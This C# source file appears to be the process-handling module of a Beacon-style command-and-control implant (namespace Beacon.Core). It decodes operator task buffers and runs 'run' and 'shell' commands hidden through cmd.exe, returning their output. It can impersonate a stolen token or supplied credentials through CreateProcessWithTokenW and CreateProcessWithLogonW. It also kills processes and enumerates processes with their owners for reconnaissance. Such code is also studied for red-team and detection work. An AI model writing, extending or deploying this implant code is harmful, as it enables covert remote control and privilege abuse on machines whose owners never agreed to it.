using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Beacon.Utils;
using Beacon.Profiles;
using System.Security.Principal;

namespace Beacon.Core
{
    /// <summary>
    /// 启动进程相关（run、shell、execute）
    /// </summary>
    class Proc
    {

        ///<summary>
        ///使用cmd.exe/c +ShellCommand执行相关命令，可选地使用备用用户名和密码。
        ///</summary>
        ///<param name="ShellCommand">要执行的ShellCommand。</param>
        ///<returns>返回命令的执行结果</returns>
        public static byte[] ShellCmdExecute(byte[] ShellCommandBuf)
        {
            byte[] pCommandBuf = null;
            string strCommand = "";
            byte[] pIsUseCmd = new byte[4];
            Array.Copy(ShellCommandBuf, 0, pIsUseCmd, 0, 4);
            Array.Reverse(pIsUseCmd);
            uint nIsUseCmd = BitConverter.ToUInt32(pIsUseCmd, 0);
            if (nIsUseCmd == 0)                                                //前4字节为0，则为run
            {
                byte[] pCmdLen = new byte[4];
                Array.Copy(ShellCommandBuf, 4, pCmdLen, 0, 4);                            //命令长度
                Array.Reverse(pCmdLen);
                uint nCmdLen = BitConverter.ToUInt32(pCmdLen, 0);
                if (nCmdLen <= 0)
                {
                    return null;
                }

                pCommandBuf = new byte[nCmdLen];
                Array.Copy(ShellCommandBuf, 8, pCommandBuf, 0, nCmdLen);                        //命令内容
                strCommand =  Bytes.ToString(pCommandBuf);
            }
            else
            {                                                                               //前4字节不为0，则为shell
                byte[] pCmdLen = new byte[4];
                Array.Copy(ShellCommandBuf, 13, pCmdLen, 0, 4);                            //命令长度
                Array.Reverse(pCmdLen);
                uint nCmdLen = BitConverter.ToUInt32(pCmdLen, 0);
                if (nCmdLen <= 0)
                {
                    return null;
                }

                pCommandBuf = new byte[nCmdLen];
                Array.Copy(ShellCommandBuf, 17, pCommandBuf, 0, nCmdLen);                        //命令内容
                strCommand = "cmd.exe" + Bytes.ToString(pCommandBuf);
            }

            if (Config._TokenPtr != IntPtr.Zero) 
            {
                return Bytes.FromString(CreateProcessWithToken(strCommand, "C:\\WINDOWS\\System32\\", Config._TokenPtr));
            }
            else if (Config._sLogonUser != "")
            {
                return Bytes.FromString(CreateProcessWithLogon(Config._sLogonUser, Config._sLogonDomain, Config._sLogonPass ,strCommand, "C:\\WINDOWS\\System32\\"));
            }
            else 
            {
                return Bytes.FromString(Execute(strCommand, false, "", "", ""));
            }
        }


        ///<summary>
        ///使用cmd.exe/c +ShellCommand执行相关命令，可选地使用备用用户名和密码。
        ///</summary>
        ///<param name="ShellCommand">要执行的ShellCommand。</param>
        ///<returns>返回命令的执行结果</returns>
        public static byte[] ShellCmdExecuteAs(byte[] ShellCommandBuf)
        {
            byte[] pCommandBuf = null;
            byte[] pDomain = null;
            byte[] pUsername = null;
            byte[] pPassword = null;

            byte[] pDomainLen = new byte[4];
            Array.Copy(ShellCommandBuf, 0, pDomainLen, 0, 4);                                       //域长度
            Array.Reverse(pDomainLen);
            uint nDomainLen = BitConverter.ToUInt32(pDomainLen, 0);
            if (nDomainLen <= 0)
            {
                return null;
            }


            pDomain = new byte[nDomainLen];
            Array.Copy(ShellCommandBuf, 4, pDomain, 0, nDomainLen);                                 //域内容
            string strDomain = "";
            if (nDomainLen != 1)
            {
                strDomain = Bytes.ToString(pDomain);
            }


            byte[] pUsernameLen = new byte[4];
            Array.Copy(ShellCommandBuf, 4 + nDomainLen, pUsernameLen, 0, 4);                         //用户名长度
            Array.Reverse(pUsernameLen);
            uint nUsernameLen = BitConverter.ToUInt32(pUsernameLen, 0);
            if (nUsernameLen <= 0)
            {
                return null;
            }

            pUsername = new byte[nUsernameLen];
            Array.Copy(ShellCommandBuf, 4 + nDomainLen + 4, pUsername, 0, nUsernameLen);             //用户名内容
            string strUsername = Bytes.ToString(pUsername);


            byte[] pPasswordLen = new byte[4];
            Array.Copy(ShellCommandBuf, 4 + nDomainLen + 4 + nUsernameLen, pPasswordLen, 0, 4);          //密码长度
            Array.Reverse(pPasswordLen);
            uint nPasswordLen = BitConverter.ToUInt32(pPasswordLen, 0);
            if (nPasswordLen <= 0)
            {
                return null;
            }

            pPassword = new byte[nPasswordLen];
            Array.Copy(ShellCommandBuf, 4 + nDomainLen + 4 + nUsernameLen + 4, pPassword, 0, nPasswordLen);                        //密码内容

            byte[] pCmdLen = new byte[4];
            Array.Copy(ShellCommandBuf, 4 + nDomainLen + 4 + nUsernameLen + 4 + nPasswordLen, pCmdLen, 0, 4);                      //命令长度
            Array.Reverse(pCmdLen);
            uint nCmdLen = BitConverter.ToUInt32(pCmdLen, 0);
            if (nCmdLen <= 0)
            {
                return null;
            }

            pCommandBuf = new byte[nCmdLen];                                                                       //命令内容
            Array.Copy(ShellCommandBuf, 4 + nDomainLen + 4 + nUsernameLen + 4 + nPasswordLen + 4, pCommandBuf, 0, nCmdLen);

            return Bytes.FromString(CreateProcessWithLogon(strUsername, strDomain, Bytes.ToString(pPassword), "cmd.exe /c " + Bytes.ToString(pCommandBuf), "C:\\WINDOWS\\System32\\"));
        }

        public static string ShellExecute(byte[] ShellCommand, bool UseShellExecute, string Username = "", string Domain = "", string Password = "")
        {
            return Execute(Bytes.ToString(ShellCommand), UseShellExecute, "", "", "");
        }


        ///<summary>
        ///执行用户所输入的ShellCommand命令，可选地使用备用用户名和密码。
        ///</summary>
        ///<param name="Command">要执行的ShellCommand，。</param>
        ///<param name="UseShellExecute">fasle则返回执行结果，true则返回空字符串</param>
        ///<param name="Username">执行命令时可选备选用户名。</param>
        ///<param name="Domain">执行命令时可选可选域。</param>
        ///<param name="Password">执行命令时的可选密码。</param>
        ///<returns>返回命令的执行结果</returns>
        public static string Execute(string Command, bool UseShellExecute = false, string Username = "", string Domain = "", string Password = "")
        {
            return Execute(Command, Environment.CurrentDirectory, UseShellExecute, Username, Domain, Password);
        }


        ///<summary>
        ///执行用户所输入的ShellCommand命令，可选地使用备用用户名和密码。
        ///</summary>
        ///<param name="Command">要执行的ShellCommand，。</param>
        ///<param name="Path">设置要启动进程的初始目录</param>
        ///<param name="UseShellExecute">fasle则返回执行结果，true则返回空字符串</param>
        ///<param name="Username">执行命令时可选备选用户名。</param>
        ///<param name="Domain">执行命令时可选可选域。</param>
        ///<param name="Password">执行命令时的可选密码。</param>
        ///<returns>返回命令的执行结果</returns>
        public static string Execute(string Command, string Path, bool UseShellExecute = false, string Username = "", string Domain = "", string Password = "")
        {
            if (string.IsNullOrEmpty(Command)) { return ""; }

            string ShellCommandName = Command.Split(' ')[0];
            string ShellCommandArguments = "";
            if (Command.Contains(" "))
            {
                ShellCommandArguments = Command.Replace(ShellCommandName + " ", "");
            }

            using (Process process = new Process())
            {
                if (Username != "")
                {
                    process.StartInfo.UserName = Username;
                    process.StartInfo.Domain = Domain;
                    System.Security.SecureString SecurePassword = new System.Security.SecureString();
                    foreach (char c in Password)
                    {
                        SecurePassword.AppendChar(c);
                    }
                    process.StartInfo.Password = SecurePassword;
                }
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.WorkingDirectory = Path;
                process.StartInfo.FileName = ShellCommandName;
                process.StartInfo.Arguments = ShellCommandArguments;
                process.StartInfo.UseShellExecute = UseShellExecute;
                if (!process.StartInfo.UseShellExecute)
                {
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.RedirectStandardError = true;
                    StringBuilder output = new StringBuilder();
                    process.OutputDataReceived += (sender, args) => { output.AppendLine(args.Data); };
                    process.ErrorDataReceived += (sender, args) => { output.AppendLine(args.Data); };
                    process.Start();
                    process.BeginOutputReadLine();
                    process.BeginErrorReadLine();
                    //process.WaitForExit();
                    process.WaitForExit(Config._nProcWaitTime);
                    return output.ToString();
                }
                process.Start();
                process.WaitForExit(Config._nProcWaitTime);
                return "";
            }
        }


        ///<summary>
        ///通过指定模拟令牌来创建进程，需要SeAssignPrimaryTokenPrivilege权限（通常仅对管理用户可用）
        ///</summary>
        ///<param name="Command">要执行的命令，包含相关参数。</param>
        ///<param name="hToken">模拟令牌的句柄。</param>
        ///<returns>所创建进程的执行结果。</returns> 
        public static string CreateProcessWithToken(string Command, IntPtr hToken)
        {
            return CreateProcessWithToken(Command, Environment.CurrentDirectory, hToken);
        }


        ///<summary>
        ///通过指定模拟令牌来创建进程，需要SeAssignPrimaryTokenPrivilege权限（通常仅对管理用户可用）
        ///</summary>
        ///<param name="Command">要执行的命令，包含相关参数。</param>
        ///<param name="Path">设置要启动进程的初始目录</param>
        ///<param name="hToken">模拟令牌的句柄。</param>
        ///<returns>所创建进程的执行结果。</returns> 
        public static string CreateProcessWithToken(string Command, string Path, IntPtr hToken)
        {
            if (string.IsNullOrEmpty(Command)) { return ""; }

            using (AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable))
            {
                Win32.ProcessThreadsAPI._PROCESS_INFORMATION ProcInfo;
                using (AnonymousPipeClientStream pipeClient = new AnonymousPipeClientStream(PipeDirection.Out, pipeServer.GetClientHandleAsString()))
                {
                    Win32.ProcessThreadsAPI._STARTUPINFO StartupInfo = new Win32.ProcessThreadsAPI._STARTUPINFO
                    {
                        wShowWindow = 0,
                        hStdOutput = pipeClient.SafePipeHandle.DangerousGetHandle(),
                        hStdError = pipeClient.SafePipeHandle.DangerousGetHandle(),
                        dwFlags = (uint)(Win32.ProcessThreadsAPI.STARTF.STARTF_USESTDHANDLES | Win32.ProcessThreadsAPI.STARTF.STARTF_USESHOWWINDOW)
                    };
                    StartupInfo.cb = (uint)Marshal.SizeOf(StartupInfo);

                    if (!Win32.Advapi32.CreateProcessWithTokenW(
                        hToken,                             // hToken
                        Win32.Advapi32.LOGON_FLAGS.NONE,    // dwLogonFlags
                        null,                               // lpApplicationName
                        Command,                            // lpCommandLine
                        Win32.Advapi32.CREATION_FLAGS.NONE, // dwCreationFlags
                        IntPtr.Zero,                        // lpEnvironment
                        Path,                               // lpCurrentDirectory
                        ref StartupInfo,                    // lpStartupInfo
                        out ProcInfo)                       // lpProcessInfo
                    )
                    {
                        return $"Error: {new Win32Exception(Marshal.GetLastWin32Error()).Message}";
                    }
                }
                using (StreamReader reader = new StreamReader(pipeServer))
                {
                    Thread t = new Thread(() =>
                    {
                        Win32.Kernel32.WaitForSingleObject(ProcInfo.hProcess, 0xFFFFFFFF);
                    });
                    t.Start();
                    string output = reader.ReadToEnd();
                    t.Join();
                    return output;
                }
            }
        }


        public static string CreateProcessWithLogon(string Username = "", string Domain = "", string Password = "", string Command = "", string Path = "")
        {
            if (string.IsNullOrEmpty(Command)) { return ""; }

            using (AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable))
            {
                Win32.ProcessThreadsAPI._PROCESS_INFORMATION ProcInfo;
                using (AnonymousPipeClientStream pipeClient = new AnonymousPipeClientStream(PipeDirection.Out, pipeServer.GetClientHandleAsString()))
                {
                    Win32.ProcessThreadsAPI._STARTUPINFO StartupInfo = new Win32.ProcessThreadsAPI._STARTUPINFO
                    {
                        wShowWindow = 0,
                        hStdOutput = pipeClient.SafePipeHandle.DangerousGetHandle(),
                        hStdError = pipeClient.SafePipeHandle.DangerousGetHandle(),
                        dwFlags = (uint)(Win32.ProcessThreadsAPI.STARTF.STARTF_USESTDHANDLES | Win32.ProcessThreadsAPI.STARTF.STARTF_USESHOWWINDOW)
                    };
                    StartupInfo.cb = (uint)Marshal.SizeOf(StartupInfo);

                    if (!Win32.Advapi32.CreateProcessWithLogonW(
                Username,
                Domain,
                Password,
                2,
                null,
                Path + Command,
                0x00000010,
                IntPtr.Zero,
                Path,
                ref StartupInfo,
                out ProcInfo)
                    )
                    {
                        return $"Error: {new Win32Exception(Marshal.GetLastWin32Error()).Message}";
                    }
                }
                using (StreamReader reader = new StreamReader(pipeServer))
                {
                    Thread t = new Thread(() =>
                    {
                        Win32.Kernel32.WaitForSingleObject(ProcInfo.hProcess, 0xFFFFFFFF);
                    });
                    t.Start();
                    string output = reader.ReadToEnd();
                    t.Join();
                    return output;
                }
            }
        }

        ///<summary>
        ///通过Pid结束相关进程
        ///</summary>
        ///<param name="Pid">要结束相关进程的Pid值</param>
        ///<returns>true则成功结束，否则返回false</returns> 
        public static byte[] KillProcess(byte[] Pid)
        {
            Array.Reverse(Pid);
            int nPid = BitConverter.ToInt32(Pid, 0);
            Process process = Process.GetProcessById(nPid);
            process.Kill();
            if (process.HasExited)
            {
                return Bytes.FromString("ok");
            }
            else 
            {
                return Bytes.FromString("fail");
            }
        }


        ///<summary>
        ///查看当前进程列表
        ///</summary>
        ///<returns>返回进程列表</returns> 
        public static byte[] GetProcessList(byte[] pBuf)
        {
            var processorArchitecture = GetArchitecture();
            Process[] processes = Process.GetProcesses().OrderBy(P => P.Id).ToArray();
            string sRes = String.Format("Pid\tPpid\tName\tPath\tSessionID\tOwner\tArchitecture");
            foreach (Process process in processes)
            {
                int processId = process.Id;
                int parentProcessId = GetParentProcess(process);
                string processName = process.ProcessName;
                string processPath = string.Empty;
                int sessionId = process.SessionId;
                string processOwner = GetProcessOwner(process);
                Win32.Kernel32.Platform processArch = Win32.Kernel32.Platform.Unknown;

                if (parentProcessId != 0)
                {
                    try
                    {
                        processPath = process.MainModule.FileName;
                    }
                    catch (System.ComponentModel.Win32Exception) { }
                }

                if (processorArchitecture == Win32.Kernel32.Platform.x64)
                {
                    processArch = IsWow64(process) ? Win32.Kernel32.Platform.x86 : Win32.Kernel32.Platform.x64;
                }
                else if (processorArchitecture == Win32.Kernel32.Platform.x86)
                {
                    processArch = Win32.Kernel32.Platform.x86;
                }
                else if (processorArchitecture == Win32.Kernel32.Platform.IA64)
                {
                    processArch = Win32.Kernel32.Platform.x86;
                }

                sRes += String.Format("\n{0}\t{1}\t{2}\t{3}\t{4}\t{5}\t{6}", processId, parentProcessId, processName, processPath, sessionId, processOwner, processArch);
            }
            return Bytes.FromString(sRes);
        }


        /// <summary>
        /// Checks if a process is a Wow64 process
        /// </summary>
        /// <author>Daniel Duggan (@_RastaMouse)</author>
        /// <param name="Process">Process to check Wow64</param>
        /// <returns>True if process is Wow64, false otherwise. Returns false if unsuccessful.</returns>
        ///<summary>
        ///检查进程是否为Wow64进程
        ///</summary>
        ///<author>Daniel Duggan（@u RastaMouse）</author>
        ///检查Wow64的过程
        ///<返回>如果进程为WO64，则为true，否则为false。如果失败，则返回false。</Returns>
        public static bool IsWow64(Process Process)
        {
            try
            {
                Win32.Kernel32.IsWow64Process(Process.Handle, out bool isWow64);
                return isWow64;
            }
            catch (InvalidOperationException)
            {
                return false;
            }
            catch (System.ComponentModel.Win32Exception)
            {
                return false;
            }
        }

        /// <summary>
        /// Gets the username of the owner of a process
        /// </summary>
        /// <author>Daniel Duggan (@_RastaMouse)</author>
        /// <param name="Process">Process to get owner of</param>
        /// <returns>Username of process owner. Returns empty string if unsuccessful.</returns>
        ///<summary>
        ///获取进程所有者的用户名
        ///</summary>
        ///<author>Daniel Duggan（@u RastaMouse）</author>
        ///<param name=“Process”>获取所有者的过程
        ///<returns>进程所有者的用户名。如果不成功，则返回空字符串。</Returns>
        public static string GetProcessOwner(Process Process)
        {
            try
            {
                Win32.Kernel32.OpenProcessToken(Process.Handle, 8, out IntPtr handle);
                using (var winIdentity = new WindowsIdentity(handle))
                {
                    return winIdentity.Name;
                }
            }
            catch (InvalidOperationException)
            {
                return string.Empty;
            }
            catch (System.ComponentModel.Win32Exception)
            {
                return string.Empty;
            }
        }

        /// <summary>
        /// Gets the architecture of the OS.
        /// </summary>
        /// <author>Daniel Duggan (@_RastaMouse)</author>
        ///<summary>
        ///获取操作系统的体系结构。
        ///</summary>
        ///<author>Daniel Duggan（@u RastaMouse）</author>
        public static Win32.Kernel32.Platform GetArchitecture()
        {
            const ushort PROCESSOR_ARCHITECTURE_INTEL = 0;
            const ushort PROCESSOR_ARCHITECTURE_IA64 = 6;
            const ushort PROCESSOR_ARCHITECTURE_AMD64 = 9;

            var sysInfo = new Win32.Kernel32.SYSTEM_INFO();
            Win32.Kernel32.GetNativeSystemInfo(ref sysInfo);

            switch (sysInfo.wProcessorArchitecture)
            {
                case PROCESSOR_ARCHITECTURE_AMD64:
                    return Win32.Kernel32.Platform.x64;
                case PROCESSOR_ARCHITECTURE_INTEL:
                    return Win32.Kernel32.Platform.x86;
                case PROCESSOR_ARCHITECTURE_IA64:
                    return Win32.Kernel32.Platform.IA64;
                default:
                    return Win32.Kernel32.Platform.Unknown;
            }
        }

        /// <summary>
        /// Gets the parent process id of a Process
        /// </summary>
        /// <author>Daniel Duggan (@_RastaMouse)</author>
        /// <param name="Process"></param>
        /// <returns>Parent Process Id. Returns 0 if unsuccessful</returns>
        ///<summary>
        ///获取进程的父进程id
        ///</summary>
        ///<author>Daniel Duggan（@u RastaMouse）</author>
        ///<param name=“Process”></param>
        ///<returns>父进程Id。如果不成功，则返回0</returns>
        public static int GetParentProcess(Process Process)
        {
            try
            {
                return GetParentProcess(Process.Handle);
            }
            catch (InvalidOperationException)
            {
                return 0;
            }
            catch (System.ComponentModel.Win32Exception)
            {
                return 0;
            }
        }

        /// <summary>
        /// Gets the parent process id of a process handle
        /// </summary>
        /// <author>Daniel Duggan (@_RastaMouse)</author>
        /// <param name="Handle">Handle to the process to get the parent process id of</param>
        /// <returns>Parent Process Id</returns>
        ///<summary>
        ///获取进程句柄的父进程id
        ///</summary>
        ///<author>Daniel Duggan（@u RastaMouse）</author>
        ///<param name=“Handle”>处理进程，以获取父进程id</param>
        ///<returns>父进程Id</returns>
        private static int GetParentProcess(IntPtr Handle)
        {
            var basicProcessInformation = new Native.PROCESS_BASIC_INFORMATION();
            IntPtr pProcInfo = Marshal.AllocHGlobal(Marshal.SizeOf(basicProcessInformation));
            Marshal.StructureToPtr(basicProcessInformation, pProcInfo, true);
            Win32.Ntdll32.NtQueryInformationProcess(Handle, Native.PROCESSINFOCLASS.ProcessBasicInformation, pProcInfo, Marshal.SizeOf(basicProcessInformation), out int returnLength);
            basicProcessInformation = (Native.PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(pProcInfo, typeof(Native.PROCESS_BASIC_INFORMATION));

            return basicProcessInformation.InheritedFromUniqueProcessId;
        }

    }
}
